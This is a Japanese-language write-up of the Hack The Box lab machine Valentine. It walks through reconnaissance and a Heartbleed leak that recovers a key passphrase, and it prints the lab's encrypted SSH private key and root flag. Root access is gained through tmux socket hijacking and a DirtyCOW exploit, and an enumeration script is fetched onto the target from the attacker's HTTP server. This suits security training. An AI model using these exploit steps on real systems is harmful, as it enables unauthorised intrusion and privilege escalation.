# Valentine

* ping確認

  ```bash
  ping 10.10.10.79
  PING 10.10.10.79 (10.10.10.79) 56(84) bytes of data.
  64 bytes from 10.10.10.79: icmp_seq=1 ttl=63 time=126 ms
  64 bytes from 10.10.10.79: icmp_seq=2 ttl=63 time=151 ms
  64 bytes from 10.10.10.79: icmp_seq=3 ttl=63 time=175 ms
  ```

* port確認

  ```bash
  nmap -sV 10.10.10.79                                             
  Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 10:39 JST      
  Nmap scan report for 10.10.10.79                                     
  Host is up (0.25s latency).                                          
  Not shown: 997 closed tcp ports (conn-refused)                       
  PORT    STATE SERVICE  VERSION
  22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
  80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
  443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 53.38 seconds
  ```

* serachsploitで脆弱性確認

  * OpenSSH

    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ searchsploit OpenSSH 5.9p1 
    ----------------------------------- ---------------------------------
     Exploit Title                     |  Path
    ----------------------------------- ---------------------------------
    OpenSSH 2.3 < 7.7 - Username Enume | linux/remote/45210.py
    OpenSSH 2.3 < 7.7 - Username Enume | linux/remote/45233.py
    OpenSSH < 6.6 SFTP (x64) - Command | linux_x86-64/remote/45000.c
    OpenSSH < 6.6 SFTP - Command Execu | linux/remote/45001.py
    OpenSSH < 7.4 - 'UsePrivilegeSepar | linux/local/40962.txt
    OpenSSH < 7.4 - agent Protocol Arb | linux/remote/40963.txt
    OpenSSH < 7.7 - User Enumeration ( | linux/remote/45939.py
    ----------------------------------- ---------------------------------
    Shellcodes: No Results
    
    ```

  * Apache

    ```bash
    ┌──(kali㉿kali)-[~]
    └─$ searchsploit Apache httpd 2.2.22
    Exploits: No Results
    Shellcodes: No Results
    
    ┌──(kali㉿kali)-[~]
    └─$ searchsploit Apache httpd 2.2
    Exploits: No Results
    Shellcodes: No Results
    ```

* OpenSSH < 7.4 - 'UsePrivilegeSepar について調査

  * [OpenSSH<7.4の複数の脆弱性](https://jp.tenable.com/plugins/nessus/96151)
    * CVE-2016-10009：権限昇格の記載あり
    * CVE-2016-10010
    * CVE-2016-10011：権限昇格の記載あり
    * CVE-2016-10012
  * CVE-2016-10009
    * [JVNDB](https://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-006607.html)
    * [Exploit-DB](https://www.exploit-db.com/exploits/40963)[PKCS#11(Public-Key Cryptography Standard)](https://access.redhat.com/documentation/ja-jp/red_hat_enterprise_linux/8/html/security_hardening/configuring-applications-to-use-cryptographic-hardware-through-pkcs-11_security-hardening)
  * CVE-2016-10011
    * [JVNDB](https://jvndb.jvn.jp/ja/contents/2016/JVNDB-2016-006609.html)

* port:80にアクセス

  ![image-20220716114249592](img/image-20220716114249592.png)

* Dirbでディレクトリ検索

  ```bash
  ┌──(kali㉿kali)-[~/Documents/HTB/Valentine]
  └─$ sudo dirb http://10.10.10.79
  [sudo] kali のパスワード:
  
  -----------------
  DIRB v2.22    
  By The Dark Raver
  -----------------
  
  START_TIME: Sat Jul 16 11:31:02 2022
  URL_BASE: http://10.10.10.79/
  WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
  
  -----------------
  
                                                                       GENERATED WORDS: 4612
  
  ---- Scanning URL: http://10.10.10.79/ ----
                                                                       + http://10.10.10.79/cgi-bin/ (CODE:403|SIZE:287)                   
  + http://10.10.10.79/decode (CODE:200|SIZE:552)                     
                                                                       ==> DIRECTORY: http://10.10.10.79/dev/
  + http://10.10.10.79/encode (CODE:200|SIZE:554)                     
  + http://10.10.10.79/index (CODE:200|SIZE:38)                       
  + http://10.10.10.79/index.php (CODE:200|SIZE:38)                   
  + http://10.10.10.79/server-status (CODE:403|SIZE:292)              
                                                                      
  ---- Entering directory: http://10.10.10.79/dev/ ----
                                                                       (!) WARNING: Directory IS LISTABLE. No need to scan it.
      (Use mode '-w' if you want to scan it anyway)
                                                                                 
  -----------------
  
  ```

  ```bash
  └─$ sudo dirb http://10.10.10.79/dev/                                
  [sudo] kali のパスワード:
  
  -----------------
  DIRB v2.22    
  By The Dark Raver
  -----------------
  
  START_TIME: Sat Jul 16 11:49:10 2022
  URL_BASE: http://10.10.10.79/dev/
  WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
  
  -----------------
  
                                                                       GENERATED WORDS: 4612
  
  ---- Scanning URL: http://10.10.10.79/dev/ ----
                                                                       + http://10.10.10.79/dev/notes (CODE:200|SIZE:227)                  
                                                                                 
  -----------------
  END_TIME: Sat Jul 16 11:58:00 2022
  DOWNLOADED: 4612 - FOUND: 1
  
  ```
  
  

* /dev/notesの中身

  ```bash
  ┌──(kali㉿kali)-[~/Documents/HTB/Valentine]
  └─$ wget http://10.10.10.79/dev/notes                                
  --2022-07-16 12:06:25--  http://10.10.10.79/dev/notes
  10.10.10.79:80 に接続しています... 接続しました。
  HTTP による接続要求を送信しました、応答を待っています... 200 OK
  長さ: 227 [text/plain]
  `notes' に保存中
  
  notes             100%[==========>]     227  --.-KB/s 時間 0s       
  
  2022-07-16 12:06:26 (9.18 MB/s) - `notes' へ保存完了 [227/227]
  
  
  ┌──(kali㉿kali)-[~/Documents/HTB/Valentine]
  └─$ ls                                                               
  notes
  
  ┌──(kali㉿kali)-[~/Documents/HTB/Valentine]
  └─$ cat notes                                                        
  To do:
  
  1) Coffee.
  2) Research.
  3) Fix decoder/encoder before going live.
  4) Make sure encoding/decoding is only done client-side.
  5) Don't use the decoder/encoder until any of this is done.
  6) Find a better way to take notes.
  
  
  ```

* decode.phpで入力検査を行う

  XSSの脆弱性あり

  ![image-20220716121343625](img/image-20220716121343625.png)

## ↓↓↓↓↓↓以降writeup参照↓↓↓↓↓↓↓↓↓↓

![image-20220716123422175](img/image-20220716123422175.png)

* hype_keyの中身

  ![image-20220716133901644](img/image-20220716133901644.png)

これをエンコードする(Shift-JISでデコードできる)

https://so-zou.jp/web-app/text/encode-decode/

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----

秘密鍵を保存してsshする

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Valentine]
└─$ ssh -i hype_key hype@10.10.10.79
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'hype_key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "hype_key": bad permissions
hype@10.10.10.79's password: 

```

badpermissonsと怒られるのでpermissionを変更する

```bash
┌──(kali㉿kali)-[~/Documents/HTB/Valentine]
└─$ chmod 400 hype_key 

┌──(kali㉿kali)-[~/Documents/HTB/Valentine]
└─$ ssh -i hype_key hype@10.10.10.79
Enter passphrase for key 'hype_key': 
hype@10.10.10.79's password:
```

やはりだめなので別の道を探る

* nmapの脆弱性スキャンを実施する

```bash
nmap --script vuln -oA vuln-scan 10.10.10.79
```

![image-20220716135505013](img/image-20220716135505013.png)port443にssl-heartbleedの脆弱性あり

[hearbleedのコミック](https://xkcd.com/1354/)

* heartbleed

  OpenSSLの暗号ソフトのライブラリの脆弱性
  悪用されるとSSL通信を行っているサーバーのメモリに格納されている情報が第三者によって閲覧され、暗号化通信の内容はＳＳＬ証明書の秘密鍵なので機密情報が漏洩する可能性がある

* 最初の踏み台を取得する（ローカルユーザでＳＳＨログインする）

  exploitを入手する

  ```bash
  git clone https://gist.github.com/10174134.git    
  ```

* exploitコードを実行してみる

  * python2.x系で記載されているため、まずpython2.7.xをインストールする
  
    →pyenv で 2.7.17に設定
  
  * ```bash
    python heartbleed.py 10.10.10.79 -p 443 -n 20
    ```
  
    ![image-20220717110814688](img/image-20220717110814688.png)
  
  * 引っかかった文字列をdecode.phpでデコードしてみる
  
    ![image-20220717110956040](img/image-20220717110956040.png)
  
  * これがパスワードの可能性があるため確認する。（この発想になるのが不思議。SSL/TLSをきちんと理解していればそういう発想になるのか？）
  
    ```bash
    ssh -i hype_key hype@10.10.10.79
    ```
  
    ```bash
    echo -n aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
    heartbleedbelievethehype
    ```
  
    ```bash
    $ ssh -i hype_key hype@10.10.10.79
    Enter passphrase for key 'hype_key': 
    sign_and_send_pubkey: no mutual signature supported
    
    ```
  
    → opensslのバージョンが新しく、暗号化がサポートされていないと怒られ、ssh接続ができない。
  
  * 以下サイトを参考に回避策を実施
  
    https://confluence.atlassian.com/bitbucketserverkb/ssh-rsa-key-rejected-with-message-no-mutual-signature-algorithm-1026057701.html
  
    ```bash
    vi ~/.ssh/config
    //以下を追加
    PubkeyAcceptedKeyTypes +ssh-rsa
    
    systemctl restart sshd
    ```
  
  * hypeでのログインに成功(パスフレーズとして先ほどのパスワードを入力)
  
    ```bash
    ssh -i hype_key hype@10.10.10.79                                                                   
    Enter passphrase for key 'hype_key': 
    Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
    
     * Documentation:  https://help.ubuntu.com/
    
    New release '14.04.5 LTS' available.
    Run 'do-release-upgrade' to upgrade to it.
    
    Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
    hype@Valentine:~$
    ```

## 権限昇格

* LinEnum.shなるものを使っている。権限奪取の際によく活用されるシェルスクリプトのようである。とりあえずダウンロードから始めよう。

  ```bash
  $ sudo find / -name LinEnum.sh 2>/dev/null
  [sudo] kali のパスワード:
  
  //結果なし
  ```

  * Document配下にダウンロード

    ```BASH
    ┌──(kali㉿kali)-[~/Documents/privshell]
    └─$ git clone https://github.com/rebootuser/LinEnum.git   
    ```

* PYTHONでHTTPサーバーを立てる

  ```bash
  # python2
  python -m SimpleHTTPServer 5555
  # python3
  python -m http.server 5555
  ```

* ターゲットホストにLimEnum.shをダウンロードする

  ```bash
  hype@Valentine:~$ wget http://10.10.16.3:5555/LinEnum.sh
  ```

* ```bash
  ./LimEnum.sh
  ```

  ubuntuがめっちゃ古い

  ![image-20220717161031845](img/image-20220717161031845.png)

  →ここでDirtyCOWの脆弱性を疑えるらしい。

  hypeがsambaの権限持ってる

  ![image-20220717161136990](img/image-20220717161136990.png)

* .bash_histroyを見てみる

  ```bash
  cat ~/.bash_history
  ```

  ![image-20220717163215273](img/image-20220717163215273.png)

  * tmuxを利用している。psでrootでgrepしてみる

    ```bash
    ps -eF | grep root
    ```

    ![image-20220717163602581](img/image-20220717163602581.png)

    ```bash
    # tmuxのセッションファイルの詳細を見る
    ls -l /.devs/dev_sess
    srw-rw---- 1 root hype 0 Jul 16 19:05 /.devs/dev_sess
    # hypeグループが所有していて読み込み、書き込み権限があることがわかる
    ```

    ```bash
    # tmuxのコマンドでセッションを復帰する
    tumx -S /.devs/dev_sess
    # rootの奪取ができる
    ```

* DirtyCowとは

  Linuxカーネルのメモリサブシステム内におけるcopy-on-writeの取り扱いで競合状態が発生し、プライベートな読み取り専用メモリマッピングが破壊されることで、特権のないローカルユーザが読み取り専用であるはずのメモリマッピング領域への書き込み権限を取得し、システム上で自らの権限を昇格させることが可能になる

  [参考サイト-ZDNet Japna](https://japan.zdnet.com/article/35090987/)

  

* DirtyCOWでも試してみる。以下exploitコードをcloneする

  https://github.com/firefart/dirtycow

  ```bash
  git clone https://github.com/firefart/dirtycow.git 
  ```

  exploitコードを対象ホストで起動するためにhttpserverを立てる

  ```
  python -m http.server 5555
  ```

  ビルドする

  ```bash
  gcc -pthread dirty.c -o dirty -lcrypt
  ./dirty
  
  hype@Valentine:~$ ./dirty 
  /etc/passwd successfully backed up to /tmp/passwd.bak
  Please enter the new password: 
  Complete line:
  firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash
  
  mmap: 7f4a87a61000
  
  hype@Valentine:~$ su firefart
  Password: 
  firefart@Valentine:/home/hype# cd /r
  root/ run/  
  firefart@Valentine:/home/hype# cd /root/
  firefart@Valentine:~# ls
  curl.sh  root.txt
  firefart@Valentine:~# cat root.txt 
  f1bb6d759df1f272914ebbc9ed7765b2
  
  ```

  

## 所感

* opensslのバージョンが8.8以降の場合、ssh-rsa sha-1ハッシュアルゴリズムを使用して生成されたＳＳＨキーを使用しようとするとＳＳＨキーが受け入れられない点は留意しておきたい。

  回避策として ~/.ssh/configファイルに”PubkeyAcceptedKeyTypes +ssh-rsa”を追加する手法についても抑えておくこと。

* Linuxの代表的な権限昇格の方法をまとめておくこと。

  * tmuxを利用したroot権限奪取
  * dirtycowを利用したroot権限奪取
